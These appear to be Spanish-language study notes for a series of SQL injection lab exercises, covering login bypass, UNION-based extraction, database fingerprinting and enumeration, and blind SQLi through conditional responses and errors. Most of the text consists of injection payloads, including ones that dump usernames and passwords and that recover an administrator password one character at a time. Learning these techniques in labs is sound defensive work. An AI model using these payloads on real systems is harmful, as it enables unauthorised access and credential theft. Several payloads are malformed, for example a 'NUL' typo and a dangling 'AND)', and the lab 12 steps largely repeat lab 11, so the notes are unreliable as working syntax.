
========================= SQL injection (SQLi) =========================

Ejemplos comunes de SQLi:
							Retrieving hidden data
								donde se puede modificar una consulta SQL para obtener resultados adicionales

							Subverting application logic
								donde se puede cambiar una consulta para interferir con la lógica de la aplicación 

							UNION attacks
								donde se puede recuperar datos de diferentes tablas de bases de datos

							Examining the database
								donde se puede extraer información sobre la versión y la estructura de la base de datos

							Blind SQL injection
								donde los resultados de una consulta que usted controla no se devuelven en las respuestas de la aplicación

					
********** Retrieving hidden data (recuperación de datos ocultos) **********

1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
   Laboratorio: vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos

	* validar vulnerabilidad de inyección SQL

	query:

 	  '+OR+1=1--


********** Subverting application logic (trastornando la lógica de la aplicación) **********

2. Lab: SQL injection vulnerability allowing login bypass
   Laboratorio: vulnerabilidad de inyección SQL que permite omitir el inicio de sesión

	* ingresar en el username o nombre de usuario

	query:

	  administrator'--

		
********** UNION attacks (ataques UNION) **********

3.Lab: SQL injection UNION attack, determining the number of columns returned by the query
  Laboratorio: Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta
	
	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas

	  ' ORDER BY 1--
	  ' ORDER BY 2--
	  ' ORDER BY 3--
	  ' ...

	or

	  ' UNION SELECT NULL--
	  ' UNION SELECT NULL,NULL--
	  ' UNION SELECT NULL,NULL,NULL--
	  ' ...	

	query:

	  '+ORDER+BY+3--
	  '+UNION+SELECT+NULL,NULL,NULL--			** Microsoft, MySQL, PostgreSQL
	  '+UNION+SELECT+NULL,NUL,NULL+FROM+DUAL--	** ORACLE


********** Subverting application logic (trastornando la lógica de la aplicación) **********

4.SQL injection UNION attack, finding a column containing text 
  Laboratorio: Ataque UNION de inyección SQL, encontrando una columna que contiene texto

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	  ' UNION SELECT 'a',NULL,NULL--
	  ' UNION SELECT NULL,'a',NULL--
	  ' UNION SELECT NULL,NULL,'a'--
	  '...

	query:

	  '+ORDER+BY+2--
	  '+UNION+SELECT+NULL,'a'--			** Microsoft, MySQL, PostgreSQL
	  '+UNION+SELECT+NULL,'a'+FROM+DUAL--	** ORACLE
		

5. Lab: SQL injection UNION attack, retrieving data from other tables
   Laboratorio: Ataque UNION de inyección SQL, recuperación de datos de otras tablas

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	* extraer datos de otras tablas
	
	query:

	  '+UNION+SELECT+username,password+FROM+users--



----- Recuperar múltiples valores dentro de una sola columna -----


   concatenar valores en una columna

	Database type 		Query
	==========================================================================
	Microsoft 	' UNION SELECT username + '~' + password FROM users--
	MySQL 		' UNION SELECT username '~' password FROM users--
	Oracle		' UNION SELECT username || '~' || password FROM users--
	PostgreSQL 	' UNION SELECT username || '~' || password FROM users--


	
6.  SQL injection UNION attack, retrieving multiple values in a single column
    Laboratorio: Ataque UNION de inyección SQL, recuperación de múltiples valores en una sola columna

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	* concatenar y extraer valores de otras tablas

	query:

	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



********** Examining the database (examinando la base de datos) **********


   Consultar el tipo y la versión de la base de datos   

	Database type 		Query
	=======================================================
	Microsoft, MySQL 	SELECT @@version
	Oracle 				SELECT * FROM v$version
						SELECT banner FROM v$version
						SELECT version FROM v$instance
	PostgreSQL 			SELECT version()  
   

	query

	  ' UNION SELECT @@version--


7. Lab: SQL injection attack, querying the database type and version on Oracle
   Laboratorio: Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string

	  ' UNION SELECT 'a',NULL,NULL FROM DUAL--
	  ' UNION SELECT NULL,'a',NULL FROM DUAL--
	  ' UNION SELECT NULL,NULL,'a' FROM DUAL--
	  '...
	  
	* combinar el paso anterior con la query de consulta tipo y versión de la base de datos 

	query:

	  '+UNION+SELECT+banner,NULL+FROM+v$version+DUAL--	opción 1
	  '+UNION+SELECT+version,NULL+FROM+v$instance+DUAL--	opción 2



8. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
   Laboratorio: Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en MySQL y Microsoft


	* encontrar el numero de columnas opción 1 para database MySQL
	  
	  ' ORDER BY 1#	tambien con -- \
	  ' ORDER BY 2#	tambien con -- \
	  ' ORDER BY 3#	tambien con -- \
	  ' ...

	* validar cual es de tipo string

	  ' UNION SELECT 'a',NULL,NULL#	tambien con -- \
	  ' UNION SELECT NULL,'a',NULL#	tambien con -- \
	  ' UNION SELECT NULL,NULL,'a'#	tambien con -- \
	  '...

	* combinar el paso anterior con la query de consulta tipo y versión de la base de datos 

	query:
	
	  '+UNION+SELECT+@@version,NULL-- \		opción 1
      '+UNION+SELECT+@@version,NULL#		opción 2



----- Listado del contenido de la base de datos -----

	
	* Microsoft, MySQL, PostgreSQL

   listar las tablas en una database:
	
	
	SELECT * FROM information_schema.tables


TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE


   listar columnas de una tabla identificada:
	
	SELECT * FROM information_schema.columns WHERE table_name = 'Users'


TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar


	* ORACLE

   listar las tablas en una database:	

	SELECT * FROM all_tables


   listar columnas de una tabla identificada:

	SELECT * FROM all_tab_columns WHERE table_name = 'USERS'



9. Lab: SQL injection attack, listing the database contents on non-Oracle databases
   Laboratorio: Ataque de inyección SQL, enumerando el contenido de la base de datos en bases de datos que no son de Oracle

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string
	
	* consultar el tipo y versión database
	
	* listar las tablas de la database

	query:

	  '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

	* listar las tablas de la database

	query:

	  '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='nombre_tablas_idenficadas'--		

	* concatenar y extraer valores de otras tablas

	query:

	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--




10. Lab: SQL injection attack, listing the database contents on Oracle
    Laboratorio: Ataque de inyección SQL, enumerando el contenido de la base de datos en Oracle

	* validar vulnerabilidad de inyección SQL

	* encontrar el numero de columnas ambos métodos

	* validar cual es de tipo string
	
	* consultar el tipo y versión database
	
	* listar las tablas de la database

	query:

	  '+UNION+SELECT+table_name,NULL+FROM+all_tables+DUAL--

	* listar las tablas de la database

	query:

	  '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='nombre_tablas_identificadas'--

	* concatenar y extraer valores de otras tablas

	query:

	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



********** Blind SQL injection vulnerabilities (Vulnerabilidades de inyección de SQL ciega) **********

	* Inyectar una nueva condición en lógica booleana o desencadenar condicionalmente un error como una división por cero.

	* Desencadenar condicionalmente un retraso de tiempo en el procesamiento de la consulta

	* Desencadenar una interacción de red fuera de banda mediante técnicas OAST (Out-of-band application security testing). Extraer los datos colocandolos en una búsqueda de 
	  DNS para un dominio controlado.

	
----- Explotación blind SQLi mediante la activación de respuestas condicionales -----

	La aplicación se comporta de forma diferente dependiendo de si la consulta SQL devuelve algún dato, en aplicaciones con cookies de seguimiento vulnerables, si devuelve datos 
	es porque se esta envíando un tracking reconocido, y si no devuelve datos es porque el tracking no es reconocido.

	   Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

	   query para validar la cookie:
		
		SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

	   condición inyectada:

		...xyz' AND '1'='1		* devolverá un resultado
		...xyz' AND '1'='2		* no devuelve nada

	   
		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm	* devolverá un resultado si el primer caracter del password es mayor a m
		
		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't	* no devuelve nada si el primer caracter del password es mayor a t
		
		xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's	* devolverá un resultado si el primer caracter del password es igual a s



11. Lab: Blind SQL injection with conditional responses
    Laboratorio: Inyección SQL ciega con respuestas condicionales

	* identificar la cookie de seguimiento: F12, en almacenamiento, cookies, TraickingId
		
	   TrackingId:"wNIglZdTLVAeUv8I"

	* consultar la cookie de seguimiento

			utilizamos BurpSuite para modificar la cookie con el objetivo de identificar un parametro en la
			página web que nos permite diferenciar evento cuando la cookie es verdadera y cuando la cookie
			es falsa; este identificador nos confirma la existencia del blind SQLi.
			
				* Si el tracking id existe 		-> la query retorna el valor	->	ej: un mensaje
				* Si el tracking id no existe 	-> la query no retorna nada		->  ej: no hay mensaje	
			
		Ejemplo de la query que realiza la consulta de comparación de la existencia del TrackingId
	   
	   '+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I'

	* inyectar una consulta verdadera para que exista el tracking y mantener el evento identificador

		'+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I' AND 1=1--

	* inyectar una consulta falsa para que no exista el tracking y evitar el evento identificador

		'+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I' AND 1=3--

	* validar la existencia de tablas al inyectar una consulta verdadera agregando una supuesta tabla
		si hay tracking 	-> consulta verdadera existe la tabla
		si no hay tracking	-> conuslta falsa no existe la tabla

		...'wNIglZdTLVAeUv8I' AND (SELECT 'xyz' FROM users LIMIT 1)='xyz'--

	* validar la existencia de usuarios al inyectar una consulta verdadera en la tabla identificada
		si hay tracking 	-> consulta verdadera existe el usuario
		si no hay tracking	-> conuslta falsa no existe el usuario

		...'wNIglZdTLVAeUv8I' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

	* enumerar el password del usuario identificado para determinar su tamaño
		si hay tracking 	-> consulta verdadera el tamaño es mayor que nuestro valor
		si no hay tracking	-> conuslta falsa el tamaño menor o igual que nuestro valor

		enumeración con intruder -> sniper -> payloads -> numbers -> sequential -> inicio-fin-pasos

		...'wNIglZdTLVAeUv8I' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--

	* enumerar el password de usuario identificado para determinar caracter por caracter el valor del password
		si hay tracking 	-> consulta verdadera el caracter es mayor que nuestro valor
		si no hay tracking	-> conuslta falsa el caracter es menor o igual que nuestro valor

		enumeración con intruder -> cluster bomb -> payloads 
															1. numbers 		-> sequential	-> inicio-fin-pasos
															2. brute force 	-> options 		-> maximo-minimo

		...'wNIglZdTLVAeUv8I' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'a'--

		or

		...'wNIglZdTLVAeUv8I' AND (SELECT SUBSTRING (password,1,1) username FROM users WHERE username='administrator' AND)='a'--


----- Inducción de respuestas condicionales mediante la activación de errores SQL -----

	Hay aplicaciones que no se comportan de forma diferente dependiendo de si la consulta SQL devuelve algún dato, por lo que el cambiar la condición no hay una diferencia
	en la respuesta de la aplicación.

	En ocasiones es posible inducir a la aplicación que devuelva respuestas condicionales activando los errores SQL condicionalmente, cuando los errores en la database no 
	son bien manejados. Se modifica la consulta para que cause errores (mensaje de error) en la database si la condición es verdadera y no cause errores si la condición es falsa.

	   condición inyectada:
		
		...xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a	->	al ser falsa la condición del case, se ejecuta que 'a'='a' lo que no produce error
		...xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a	->	al ser verdadera la condición del case, se evalúa 1/0 provocando un error de división por cero


		utilizando está técnica, se puede recuperar datos validando sistematicamente un carácter a la vez:

		...xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a


12. Lab: Blind SQL injection with conditional errors
    Laboratorio: Inyección SQL ciega con errores condicionales

	* identificar la cookie de seguimiento: F12, en almacenamiento, cookies, TraickingId
		
	   TrackingId:"LZ31JivCo2taI8Vi"

	* consultar la cookie de seguimiento

			utilizamos BurpSuite para modificar la cookie con el objetivo de identificar un parametro en la
			página web que nos permite diferenciar evento cuando la cookie es verdadera y cuando la cookie
			es falsa; este identificador nos confirma la existencia del blind SQLi.
			
				* Si el tracking id existe 		-> la query retorna el valor	->	ej: un mensaje
				* Si el tracking id no existe 	-> la query no retorna nada		->  ej: no hay mensaje	
			
		Ejemplo de la query que realiza la consulta de comparación de la existencia del TrackingId
	   
	   '+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I'

	* inyectar una consulta verdadera para que exista el tracking y mantener el evento identificador

		'+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--

	* inyectar una consulta falsa para que no exista el tracking y evitar el evento identificador

		'+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I' AND 1=3--

	* validar la existencia de tablas al inyectar una consulta verdadera agregando una supuesta tabla
		si hay tracking 	-> consulta verdadera existe la tabla
		si no hay tracking	-> conuslta falsa no existe la tabla

		...'wNIglZdTLVAeUv8I' AND (SELECT 'xyz' FROM users LIMIT 1)='xyz'--

	* validar la existencia de usuarios al inyectar una consulta verdadera en la tabla identificada
		si hay tracking 	-> consulta verdadera existe el usuario
		si no hay tracking	-> conuslta falsa no existe el usuario

		...'wNIglZdTLVAeUv8I' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

	* enumerar el password del usuario identificado para determinar su tamaño
		si hay tracking 	-> consulta verdadera el tamaño es mayor que nuestro valor
		si no hay tracking	-> conuslta falsa el tamaño menor o igual que nuestro valor

		enumeración con intruder -> sniper -> payloads -> numbers -> sequential -> inicio-fin-pasos

		...'wNIglZdTLVAeUv8I' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--

	* enumerar el password de usuario identificado para determinar caracter por caracter el valor del password
		si hay tracking 	-> consulta verdadera el caracter es mayor que nuestro valor
		si no hay tracking	-> conuslta falsa el caracter es menor o igual que nuestro valor

		enumeración con intruder -> cluster bomb -> payloads 
															1. numbers 		-> sequential	-> inicio-fin-pasos
															2. brute force 	-> options 		-> maximo-minimo

		...'wNIglZdTLVAeUv8I' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'a'--

		or

		...'wNIglZdTLVAeUv8I' AND (SELECT SUBSTRING (password,1,1) username FROM users WHERE username='administrator' AND)='a'--